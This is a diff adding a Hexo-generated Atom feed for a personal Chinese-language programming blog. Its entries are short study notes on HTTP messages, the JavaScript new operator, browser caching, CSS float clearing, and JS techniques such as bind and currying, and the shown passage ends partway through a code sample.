@@ -1,0 +1,845 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>GDH&#39; blog</title>
+  <subtitle>Everything will be gone.</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2016-10-02T06:14:15.885Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>GDH</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>HTTP报文</title>
+    <link href="http://yoursite.com/2016/09/08/http/"/>
+    <id>http://yoursite.com/2016/09/08/http/</id>
+    <published>2016-09-08T15:05:54.000Z</published>
+    <updated>2016-10-02T06:14:15.885Z</updated>
+    
+    <content type="html">&lt;h3 id=&quot;HTTP报文：&quot;&gt;&lt;a href=&quot;#HTTP报文：&quot; class=&quot;headerlink&quot; title=&quot;HTTP报文：&quot;&gt;&lt;/a&gt;HTTP报文：&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;起始行&lt;/li&gt;
+&lt;li&gt;首部&lt;/li&gt;
+&lt;li&gt;主体&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h4 id=&quot;请求报文起始行&quot;&gt;&lt;a href=&quot;#请求报文起始行&quot; class=&quot;headerlink&quot; title=&quot;请求报文起始行&quot;&gt;&lt;/a&gt;请求报文起始行&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;请求方式&lt;/li&gt;
+&lt;li&gt;URL&lt;/li&gt;
+&lt;li&gt;HTTP版本&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&quot;响应报文起始行&quot;&gt;&lt;a href=&quot;#响应报文起始行&quot; class=&quot;headerlink&quot; title=&quot;响应报文起始行&quot;&gt;&lt;/a&gt;响应报文起始行&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;HTTP版本&lt;/li&gt;
+&lt;li&gt;状态码&lt;/li&gt;
+&lt;li&gt;原因短语&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&quot;请求报文header&quot;&gt;&lt;a href=&quot;#请求报文header&quot; class=&quot;headerlink&quot; title=&quot;请求报文header&quot;&gt;&lt;/a&gt;请求报文header&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;Date&lt;/li&gt;
+&lt;li&gt;Accept&lt;/li&gt;
+&lt;li&gt;Accept-Language&lt;/li&gt;
+&lt;li&gt;Accept-Encoding&lt;/li&gt;
+&lt;li&gt;Cache-Control&lt;/li&gt;
+&lt;li&gt;Connection&lt;/li&gt;
+&lt;li&gt;Trailer&lt;/li&gt;
+&lt;li&gt;Host&lt;/li&gt;
+&lt;li&gt;Content-Type&lt;/li&gt;
+&lt;li&gt;Content-Encoding&lt;/li&gt;
+&lt;li&gt;Content-Length&lt;/li&gt;
+&lt;li&gt;Content-…&lt;/li&gt;
+&lt;li&gt;cookie&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&quot;响应报文header&quot;&gt;&lt;a href=&quot;#响应报文header&quot; class=&quot;headerlink&quot; title=&quot;响应报文header&quot;&gt;&lt;/a&gt;响应报文header&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;Date&lt;/li&gt;
+&lt;li&gt;Cache-Control&lt;/li&gt;
+&lt;li&gt;Connection&lt;/li&gt;
+&lt;li&gt;Content-Type&lt;/li&gt;
+&lt;li&gt;Content-Encoding&lt;/li&gt;
+&lt;li&gt;Content-Length&lt;/li&gt;
+&lt;li&gt;Content-…&lt;/li&gt;
+&lt;li&gt;Set-Cookie&lt;/li&gt;
+&lt;li&gt;Server&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;HTTP报文：&quot;&gt;&lt;a href=&quot;#HTTP报文：&quot; class=&quot;headerlink&quot; title=&quot;HTTP报文：&quot;&gt;&lt;/a&gt;HTTP报文：&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;起始行&lt;/li&gt;
+&lt;li&gt;首部&lt;/li&gt;
+&lt;li&gt;主体&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>new</title>
+    <link href="http://yoursite.com/2016/09/08/new/"/>
+    <id>http://yoursite.com/2016/09/08/new/</id>
+    <published>2016-09-08T09:10:34.000Z</published>
+    <updated>2016-10-02T06:15:50.066Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;new做了那些事&quot;&gt;&lt;a href=&quot;#new做了那些事&quot; class=&quot;headerlink&quot; title=&quot;new做了那些事&quot;&gt;&lt;/a&gt;new做了那些事&lt;/h2&gt;&lt;p&gt;var obj = new Base();&lt;/p&gt;
+&lt;p&gt;new操作符具体干了什么呢?其实很简单，就干了三件事情。&lt;/p&gt;
+&lt;p&gt;var obj  = {}; obj.__proto__ = Base.prototype; Base.call(obj);&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;第一行，我们创建了一个空对象obj&lt;br&gt;第二行，我们将这个空对象的__proto__成员指向了Base函数对象prototype成员对象&lt;br&gt;第三行，我们将Base函数对象的this指针替换成obj，然后再调用Base函数，于是我们就给obj对象赋值了一个id成员变量，这个成员变量的值是”base”，关于call函数的用法，请参看陈皓《Javascript 面向对象编程》文章&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;new做了那些事&quot;&gt;&lt;a href=&quot;#new做了那些事&quot; class=&quot;headerlink&quot; title=&quot;new做了那些事&quot;&gt;&lt;/a&gt;new做了那些事&lt;/h2&gt;&lt;p&gt;var obj = new Base();&lt;/p&gt;
+&lt;p&gt;new操作符具体干了什么呢?其实很简单，就干了三件事情。&lt;/p&gt;
+&lt;p&gt;var obj  = {}; obj.__proto__ = Base.prototype; Base.call(obj);&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>面向对象三大特性</title>
+    <link href="http://yoursite.com/2016/09/08/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
+    <id>http://yoursite.com/2016/09/08/面向对象/</id>
+    <published>2016-09-08T07:51:54.000Z</published>
+    <updated>2016-10-02T06:17:09.411Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;面向对象三大特性&quot;&gt;&lt;a href=&quot;#面向对象三大特性&quot; class=&quot;headerlink&quot; title=&quot;面向对象三大特性&quot;&gt;&lt;/a&gt;面向对象三大特性&lt;/h2&gt;&lt;h3 id=&quot;封装&quot;&gt;&lt;a href=&quot;#封装&quot; class=&quot;headerlink&quot; title=&quot;封装&quot;&gt;&lt;/a&gt;封装&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;定义： 隐藏对象属性和实现细节，仅对外公开接口&lt;/li&gt;
+&lt;li&gt;目的： 增强安全性和简化编程，使用者不必了解具体的实现细节，而只要通过外部接口，以特定的访问权限来使用类的成员&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h3 id=&quot;继承&quot;&gt;&lt;a href=&quot;#继承&quot; class=&quot;headerlink&quot; title=&quot;继承&quot;&gt;&lt;/a&gt;继承&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;目的： 实现代码复用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;多态&quot;&gt;&lt;a href=&quot;#多态&quot; class=&quot;headerlink&quot; title=&quot;多态&quot;&gt;&lt;/a&gt;多态&lt;/h3&gt;&lt;p&gt;必要条件： 继承、重写、向上转型&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;面向对象三大特性&quot;&gt;&lt;a href=&quot;#面向对象三大特性&quot; class=&quot;headerlink&quot; title=&quot;面向对象三大特性&quot;&gt;&lt;/a&gt;面向对象三大特性&lt;/h2&gt;&lt;h3 id=&quot;封装&quot;&gt;&lt;a href=&quot;#封装&quot; class=&quot;headerlink&quot; title=&quot;封装&quot;&gt;&lt;/a&gt;封装&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;定义： 隐藏对象属性和实现细节，仅对外公开接口&lt;/li&gt;
+&lt;li&gt;目的： 增强安全性和简化编程，使用者不必了解具体的实现细节，而只要通过外部接口，以特定的访问权限来使用类的成员&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>浏览器缓存控制策略</title>
+    <link href="http://yoursite.com/2016/07/20/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%AD%96%E7%95%A5/"/>
+    <id>http://yoursite.com/2016/07/20/浏览器缓存策略/</id>
+    <published>2016-07-20T12:50:32.000Z</published>
+    <updated>2016-10-01T09:59:00.797Z</updated>
+    
+    <content type="html">&lt;h1 id=&quot;浏览器缓存控制策略&quot;&gt;&lt;a href=&quot;#浏览器缓存控制策略&quot; class=&quot;headerlink&quot; title=&quot;浏览器缓存控制策略&quot;&gt;&lt;/a&gt;浏览器缓存控制策略&lt;/h1&gt;&lt;h3 id=&quot;Expires&quot;&gt;&lt;a href=&quot;#Expires&quot; class=&quot;headerlink&quot; title=&quot;Expires&quot;&gt;&lt;/a&gt;Expires&lt;/h3&gt;&lt;p&gt;采用准确日期告诉浏览器过期日期&lt;/p&gt;
+&lt;h3 id=&quot;Cache-Control&quot;&gt;&lt;a href=&quot;#Cache-Control&quot; class=&quot;headerlink&quot; title=&quot;Cache-Control&quot;&gt;&lt;/a&gt;Cache-Control&lt;/h3&gt;&lt;p&gt;采用max-age秒数告诉浏览器过期时间，优先级高于expires&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h3 id=&quot;Last-Modified-If-Modified-Since&quot;&gt;&lt;a href=&quot;#Last-Modified-If-Modified-Since&quot; class=&quot;headerlink&quot; title=&quot;Last-Modified/If-Modified-Since&quot;&gt;&lt;/a&gt;Last-Modified/If-Modified-Since&lt;/h3&gt;&lt;p&gt;配合Cache-Control使用，上述过期后则检验。&lt;/p&gt;
+&lt;h3 id=&quot;ETag-If-None-Match&quot;&gt;&lt;a href=&quot;#ETag-If-None-Match&quot; class=&quot;headerlink&quot; title=&quot;ETag/If-None-Match&quot;&gt;&lt;/a&gt;ETag/If-None-Match&lt;/h3&gt;&lt;p&gt;ETag表示文件的唯一标识，同样配合Cache-Control使用，If-None-Match优先于If-Modifed-Since&lt;/p&gt;
+&lt;p&gt;Etag出原因： &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;文件可能被周期性重写，但数据并没有改变，修改日期变了&lt;/li&gt;
+&lt;li&gt;修改的部分不重要，如注释，拼写&lt;/li&gt;
+&lt;li&gt;有些服务器无法确定判断某页面的最后修改日期&lt;/li&gt;
+&lt;li&gt;Last-Modified只能精确到秒，有些文档会在亚秒间隙发生变化。&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;浏览器缓存控制策略&quot;&gt;&lt;a href=&quot;#浏览器缓存控制策略&quot; class=&quot;headerlink&quot; title=&quot;浏览器缓存控制策略&quot;&gt;&lt;/a&gt;浏览器缓存控制策略&lt;/h1&gt;&lt;h3 id=&quot;Expires&quot;&gt;&lt;a href=&quot;#Expires&quot; class=&quot;headerlink&quot; title=&quot;Expires&quot;&gt;&lt;/a&gt;Expires&lt;/h3&gt;&lt;p&gt;采用准确日期告诉浏览器过期日期&lt;/p&gt;
+&lt;h3 id=&quot;Cache-Control&quot;&gt;&lt;a href=&quot;#Cache-Control&quot; class=&quot;headerlink&quot; title=&quot;Cache-Control&quot;&gt;&lt;/a&gt;Cache-Control&lt;/h3&gt;&lt;p&gt;采用max-age秒数告诉浏览器过期时间，优先级高于expires&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>清浮动</title>
+    <link href="http://yoursite.com/2016/06/10/%E6%B8%85%E6%B5%AE%E5%8A%A8/"/>
+    <id>http://yoursite.com/2016/06/10/清浮动/</id>
+    <published>2016-06-10T06:02:54.000Z</published>
+    <updated>2016-10-02T06:17:46.154Z</updated>
+    
+    <content type="html">&lt;h1 id=&quot;清浮动&quot;&gt;&lt;a href=&quot;#清浮动&quot; class=&quot;headerlink&quot; title=&quot;清浮动&quot;&gt;&lt;/a&gt;清浮动&lt;/h1&gt;&lt;h2 id=&quot;clear&quot;&gt;&lt;a href=&quot;#clear&quot; class=&quot;headerlink&quot; title=&quot;clear&quot;&gt;&lt;/a&gt;clear&lt;/h2&gt;&lt;h3 id=&quot;clear-left-right-both&quot;&gt;&lt;a href=&quot;#clear-left-right-both&quot; class=&quot;headerlink&quot; title=&quot;clear: left/right/both&quot;&gt;&lt;/a&gt;clear: left/right/both&lt;/h3&gt;&lt;h3 id=&quot;伪元素&quot;&gt;&lt;a href=&quot;#伪元素&quot; class=&quot;headerlink&quot; title=&quot;伪元素&quot;&gt;&lt;/a&gt;伪元素&lt;/h3&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;BFC&quot;&gt;&lt;a href=&quot;#BFC&quot; class=&quot;headerlink&quot; title=&quot;BFC&quot;&gt;&lt;/a&gt;BFC&lt;/h2&gt;&lt;h3 id=&quot;float-left-right&quot;&gt;&lt;a href=&quot;#float-left-right&quot; class=&quot;headerlink&quot; title=&quot;float: left/right&quot;&gt;&lt;/a&gt;float: left/right&lt;/h3&gt;&lt;h3 id=&quot;position-absolute-fixed&quot;&gt;&lt;a href=&quot;#position-absolute-fixed&quot; class=&quot;headerlink&quot; title=&quot;position: absolute/fixed&quot;&gt;&lt;/a&gt;position: absolute/fixed&lt;/h3&gt;&lt;h3 id=&quot;display-inline-block&quot;&gt;&lt;a href=&quot;#display-inline-block&quot; class=&quot;headerlink&quot; title=&quot;display: inline-block&quot;&gt;&lt;/a&gt;display: inline-block&lt;/h3&gt;&lt;h3 id=&quot;overflow-hidden&quot;&gt;&lt;a href=&quot;#overflow-hidden&quot; class=&quot;headerlink&quot; title=&quot;overflow: hidden;&quot;&gt;&lt;/a&gt;overflow: hidden;&lt;/h3&gt;&lt;h2 id=&quot;ZOOM&quot;&gt;&lt;a href=&quot;#ZOOM&quot; class=&quot;headerlink&quot; title=&quot;ZOOM&quot;&gt;&lt;/a&gt;ZOOM&lt;/h2&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;清浮动&quot;&gt;&lt;a href=&quot;#清浮动&quot; class=&quot;headerlink&quot; title=&quot;清浮动&quot;&gt;&lt;/a&gt;清浮动&lt;/h1&gt;&lt;h2 id=&quot;clear&quot;&gt;&lt;a href=&quot;#clear&quot; class=&quot;headerlink&quot; title=&quot;clear&quot;&gt;&lt;/a&gt;clear&lt;/h2&gt;&lt;h3 id=&quot;clear-left-right-both&quot;&gt;&lt;a href=&quot;#clear-left-right-both&quot; class=&quot;headerlink&quot; title=&quot;clear: left/right/both&quot;&gt;&lt;/a&gt;clear: left/right/both&lt;/h3&gt;&lt;h3 id=&quot;伪元素&quot;&gt;&lt;a href=&quot;#伪元素&quot; class=&quot;headerlink&quot; title=&quot;伪元素&quot;&gt;&lt;/a&gt;伪元素&lt;/h3&gt;
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>JS高技巧</title>
+    <link href="http://yoursite.com/2016/05/20/JS%E9%AB%98%E7%BA%A7%E6%8A%80%E5%B7%A7/"/>
+    <id>http://yoursite.com/2016/05/20/JS高级技巧/</id>
+    <published>2016-05-20T09:57:05.000Z</published>
+    <updated>2016-10-02T06:15:23.713Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;1-高级函数&quot;&gt;&lt;a href=&quot;#1-高级函数&quot; class=&quot;headerlink&quot; title=&quot;1.高级函数&quot;&gt;&lt;/a&gt;1.高级函数&lt;/h2&gt;&lt;h3 id=&quot;1-1-安全类型检查&quot;&gt;&lt;a href=&quot;#1-1-安全类型检查&quot; class=&quot;headerlink&quot; title=&quot;1.1 安全类型检查&quot;&gt;&lt;/a&gt;1.1 安全类型检查&lt;/h3&gt;&lt;p&gt;&lt;code&gt;typeof&lt;/code&gt;和&lt;code&gt;instanceof&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&quot;1-2-作用域安全的构造函数&quot;&gt;&lt;a href=&quot;#1-2-作用域安全的构造函数&quot; class=&quot;headerlink&quot; title=&quot;1.2 作用域安全的构造函数&quot;&gt;&lt;/a&gt;1.2 作用域安全的构造函数&lt;/h3&gt;&lt;p&gt;不用new创建对象，this的指向性问题(指向上一级)。&lt;/p&gt;
+&lt;h3 id=&quot;1-3-惰性载入函数&quot;&gt;&lt;a href=&quot;#1-3-惰性载入函数&quot; class=&quot;headerlink&quot; title=&quot;1.3 惰性载入函数&quot;&gt;&lt;/a&gt;1.3 惰性载入函数&lt;/h3&gt;&lt;p&gt;多if不用每次的判断&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;createXHR&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.XMLHttpRequest)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		createXHR=&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; XMLHttpRequest;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.ActiveXObject)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		createXHR=&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ActiveXObject(&lt;span class=&quot;string&quot;&gt;&quot;Microsoft.XMLHttp&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&quot;1-4-函数绑定&quot;&gt;&lt;a href=&quot;#1-4-函数绑定&quot; class=&quot;headerlink&quot; title=&quot;1.4 函数绑定&quot;&gt;&lt;/a&gt;1.4 函数绑定&lt;/h3&gt;&lt;p&gt;用于改变函数的执行环境&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;bind&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;fn, context&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(context, &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;context是fn函数的执行环境。&lt;br&gt;ES5中有一个原生bind()方法，使用方法：&lt;code&gt;fn.bind(context)&lt;/code&gt;;&lt;/p&gt;
+&lt;h3 id=&quot;1-5-函数柯里化&quot;&gt;&lt;a href=&quot;#1-5-函数柯里化&quot; class=&quot;headerlink&quot; title=&quot;1.5 函数柯里化&quot;&gt;&lt;/a&gt;1.5 函数柯里化&lt;/h3&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;curry&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;fn&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; args=&lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; innerArgs=&lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; finalArgs=args.concat(innerArgs);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;, finalArgs);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;先传一些参数，形成一个函数，以后就可以用先前传的参数。有点继承的意思。&lt;br&gt;与bind结合&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;bind&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;fn, context&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; args=&lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; innerArgs=&lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; finalArgs=args.concat(innerArgs);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(context, finalArgs);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span 